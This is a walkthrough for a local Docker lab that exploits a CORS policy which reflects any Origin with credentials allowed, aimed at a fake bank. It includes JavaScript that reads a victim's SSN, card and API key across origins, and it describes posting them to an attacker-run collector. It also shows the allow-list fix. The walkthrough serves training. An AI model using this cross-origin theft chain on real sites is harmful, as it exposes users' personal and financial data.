# CORS Misconfiguration Lab - Walkthrough

A cross-origin data theft against a CORS policy that reflects any `Origin` and
pairs it with `Access-Control-Allow-Credentials: true`. The victim is a fake bank
(SecureBank) on port 5000; the attacker site hosting the exploit pages and the
data collector is on port 8000.

## Start

```bash
docker-compose up --build
```

- Victim:   http://localhost:5000
- Attacker: http://localhost:8000

Tail both servers with `docker-compose logs -f` to watch the request reach the
victim and the stolen data reach the attacker.

## Phase 1 - Log in as the victim

1. Open http://localhost:5000/. Loading the page sets a `session_id=session_abc123`
   cookie, simulating a logged-in SecureBank user.
2. Click **Load My Personal Data**. The page fetches `/api/v2/user/` with
   `credentials: 'include'` and renders the email, API key, SSN, and credit card.

This is the same-origin baseline: the bank's own page reading the bank's API.

## Phase 2 - Inspect the CORS headers

Confirm the misconfiguration before exploiting it. Either use DevTools (Network
tab → the `/api/v2/user/` request → Response Headers), or curl directly:

```bash
# Vulnerable: reflects the attacker's origin and allows credentials
curl -s -D - -o /dev/null http://localhost:5000/api/v2/user/ \
  -H 'Origin: http://localhost:8000' \
  -H 'Cookie: session_id=session_abc123'
```

Look for these two lines in the response:

```
Access-Control-Allow-Origin: http://localhost:8000
Access-Control-Allow-Credentials: true
```

The server echoed back the attacker's origin. That tells the browser the
attacker is allowed to read authenticated responses.

## Phase 3 - Case 1: read the data cross-origin

1. Open http://localhost:8000/exploit-simple ("Win a Free iPhone!").
2. Click **Claim my prize**.

The page runs:

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://localhost:5000/api/v2/user/", true);
xhr.withCredentials = true;   // attach the victim's session cookie
xhr.send();
```

Because the request carries `Origin: http://localhost:8000` and the victim
reflects it with credentials allowed, the browser lets the attacker's JavaScript
read the response. The stolen data is displayed on the page as proof of concept.

## Phase 4 - Case 2: exfiltrate the data

1. Open http://localhost:8000/exploit-advanced and click **Claim my prize**.

Chain:

1. Step 1 repeats the cross-origin read from Case 1.
2. Step 2 POSTs the stolen JSON to `http://localhost:8000/collect`, the
   attacker's own collector.
3. View everything captured at http://localhost:8000/stolen-data, and watch the
   `[attacker] received exfiltrated data` lines in the logs.

## Why it works

`Access-Control-Allow-Origin` reflected from the request, combined with
`Access-Control-Allow-Credentials: true`, means *any* site can read authenticated
responses on a logged-in user's behalf. The wildcard `*` is not the only danger -
blindly reflecting the request origin is just as exploitable, and it works
alongside credentials where `*` would not.

## Fixing the victim

The `/fixed/api/v2/user/` endpoint already shows the correct pattern: validate the
origin against an allow-list before setting any CORS header.

```python
ALLOWED_ORIGINS = ['http://localhost:5000']

origin = request.headers.get('Origin')
if origin and origin in ALLOWED_ORIGINS:
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
# otherwise: no CORS headers, so the browser blocks the cross-origin read
```

Compare the two endpoints with curl - the fixed one returns no
`Access-Control-Allow-Origin` for the attacker's origin:

```bash
curl -s -D - -o /dev/null http://localhost:5000/fixed/api/v2/user/ \
  -H 'Origin: http://localhost:8000' \
  -H 'Cookie: session_id=session_abc123'
```

To close the real hole, apply the same allow-list check to `/api/v2/user/` in
`victim/app.py`, restart with `docker-compose restart victim`, and retry the
exploit pages - the cross-origin read now fails.

## Optional: Burp Suite

Proxy the browser through Burp (127.0.0.1:8080), load your data on SecureBank, and
find `GET /api/v2/user/` in the HTTP history. Send it to Repeater, add
`Origin: http://localhost:8000`, and resend to iterate on the reflected CORS
headers without using the exploit pages.
